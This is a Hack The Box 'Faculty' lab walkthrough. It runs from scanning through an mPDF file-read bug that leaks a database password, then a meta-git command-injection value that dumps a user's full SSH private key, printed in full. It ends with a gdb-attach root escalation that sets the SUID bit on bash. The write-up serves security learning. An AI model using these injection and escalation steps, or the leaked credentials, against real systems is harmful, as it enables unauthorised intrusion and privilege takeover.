---
published: true
title: Hackthebox Faculty walkthrough
date: '2022-10-22 05:57:00 +0200'
categories:
  - HTB
tags: HTB
---

# Faculty
<img src="https://i.ibb.co/m094Xwg/Faculty.png" alt="Faculty" border="0">
## Scanning :

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-02 20:40 GMT
Nmap scan report for faculty.htb (10.129.198.120)
Host is up (0.18s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp    open     http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
43669/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1447.73 seconds
```

```bash
┌──(root💀kali)-[/home/kali]
└─# nano /etc/hosts 
10.129.197.71 faculty.htb
```

## Explotation 

<img src="https://i.ibb.co/xhqHF2G/Untitled.png" alt="Untitled" border="0">

- First thing will came to your head is to try SQLi auth bypass.

<img src="https://i.ibb.co/VpKSc4v/2.png" alt="2" border="0">

- We logged in as Smith

<img src="https://i.ibb.co/Yk5wwD1/3.png" alt="3" border="0">

## Content Discovery 

```bash
┌──(root💀kali)-[/home/kali]
└─# dirb http://faculty.htb          

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jul  4 22:04:34 2022
URL_BASE: http://faculty.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://faculty.htb/ ----
==> DIRECTORY: http://faculty.htb/admin/
```

- This Endpoint looks interesting, let’s check it.

<img src="https://i.ibb.co/Yk5wwD1/3.png" alt="3" border="0">

- It’s scheduling system for a school, It uses PDF, what is the first attack came to your mind ?,  XSS → SSRF.
- It didn’t work, So we need to discover more about the Application.

<img src="https://i.ibb.co/5rfH8HC/5.png" alt="5" border="0">

- If you look at the url you will find out that the Application uses PHP libraries for generating PDF files called mPDF.
- While searching for any CVE related to mPDF I found this <a href="https://github.com/mpdf/mpdf/issues/949">Issue</a> , Let’s try it and see how it works.

<img src="https://i.ibb.co/QDT22P4/6.png" alt="6" border="0">

<img src="https://i.ibb.co/9NHgLjx/7.png" alt="7" border="0">

<img src="https://i.ibb.co/B66MgVj/8.png" alt="8" border="0">

- Before i generated an Error i think it will help me now.

```
curl "http://faculty.htb/admin/ajax.php?action=get_schecdule"
Fatal error: Uncaught Error: in /var/www/scheduling/admin/admin_class.php 
```

- After adjusting the payload to get Admin_class.php

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php';
```

- Now we need to check db_connect.php

```php
<?php
$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

- BAM ! we got creds now.

## User 

```bash
┌──(root💀kali)-[/home/kali/HTB/faculty]
└─# ssh gybolo@faculty.htb
gybolo@faculty.htb's password: Co.met06aci.dly53ro.per
gbyolo@faculty:~$
```

- First thing we need to check what we can run as as sudo.

```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: Co.met06aci.dly53ro.per
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
gbyolo@faculty:~$
```

- I search for an Exploit for meta-git and i found this report [https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)
- So i fired my RCE

```bash
gbyolo@faculty:/$ sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'
meta git cloning into 'poc | cat ~/.ssh/id_rsa' at id_rsa
id_rsa:
fatal: repository 'poc' does not exist

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
KpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrs
Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1/MlBnsWOgiRHMgcJzcWX
OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp/3+JZF19/KXJ1dr0i328j
saMlzDijF5bZjpAOcLxS0V84t99R/7bRbLdFxME/0xyb6QMKcMDnLrDUmdhiObROZFl3v5
hnsW9CoFLiKE/4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2
EAAAGBAMQwIKx3A9iOFN9vf/7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8p
PmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1/w63Rw
nJrCLu1qpMmdJgzdrEvt7jJOiN9+tcds7QBtWgvcSV+xCbB5lw0S2fBtUYmyqSNFqgFjUl
xww73MA6Zlg5PjZSESpKRnFQcs4RvMdWs7ylkvRt+s3iywEQT+N2seHgFa7AHfu4oN75fS
L/mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHad
mgTo2ZRifhuri1q8cJV/WpzN4D100+AxqmVdUKf9/iWRdffylydXa9It9vI7GjJcw4oxeW
2Y6QDnC8UtFfOLffUf+20Wy3RcTBP9Mcm+kDCnDA5y6w1JnYYjm0TmRZd7+YZ7FvQqBS4i
hP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr/oMaspxzULdwpv
JbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK/A5acYaJ/yJOyOAdsbYHpa
ELWupj/TFE/66xwXJfilBxsQctr0i62yVAVfsR0Sng5/qRt/8orbGrrNIJU2uje7ToHMLN
J0J1A6niLQuh4LBHHyTvUTRyC72P8Im5varaLEhuHxnzg1g81loA8jjvWAeUHwayNxG8uu
ng+nLalwTM/usMo9Jnvx/UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEv
Hx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or/+IbjH3JlnQOZw8JRC1RpI/uTECivtmkp4
ZrFF5YAo9ie7ctB2JIujPGXlv/F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk/yxMmg6w2Y5P5
N/NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAA
AMEAl5stT0pZ0iZLcYi+b/7ZAiGTQwWYS0p4Glxm204DedrOD4c/Aw7YZFZLYDlL2KUk6o
0M2X9joquMFMHUoXB7DATWknBS7xQcCfXH8HNuKSN385TCX/QWNfWVnuIhl687Dqi2bvBt
pMMKNYMMYDErB1dpYZmh8mcMZgHN3lAK06Xdz57eQQt0oGq6btFdbdVDmwm+LuTRwxJSCs
Qtc2vyQOEaOpEad9RvTiMNiAKy1AnlViyoXAW49gIeK1ay7z3jAAAAwQDxEUTmwvt+oX1o
1U/ZPaHkmi/VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi/yLt
ercex4AFaAjZD7sjX9vDqX8atR8M1VXOy3aQ0HGYG2FF7vEFwYdNPfGqFLxLvAczzXHBud
QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
gbyolo@faculty:/$ ssh developer@10.129.197.198 -i id_rsa
developer@faculty:~$ cat user.txt 
0b4045********************9cd0c2
```

- After some enumration i foundout i’m in DEBUG

```bash
developer@faculty:~$ groups
developer debug faculty
developer@faculty:~$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

## Root  

1. After some privilege escalation tries
2. I found out process running as a ROOT
3. And i’m in the DEBUG group
4. So I can run GDB and attach it to the process
5. And call system function to spwan a root shell

```bash
developer@faculty:~$ ps faux | grep ^root | grep python3
root   731   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3
developer@faculty:~$ gdb -p 731
Attaching to process 731
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 44975]
(gdb) quit
A debugging session is active.
Quit anyway? (y or n) y
[Inferior 1 (process 731) detached]
developer@faculty:~$
```

```
developer@faculty:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
2a9*************************d03
bash-5.0#
```

![https://media4.giphy.com/media/ywkTx4yhxqweTO46mT/giphy.gif?cid=790b761118b7c3bdee7413d3ddb1400019bbc22c4f0826ce&rid=giphy.gif&ct=g](https://media4.giphy.com/media/ywkTx4yhxqweTO46mT/giphy.gif?cid=790b761118b7c3bdee7413d3ddb1400019bbc22c4f0826ce&rid=giphy.gif&ct=g)
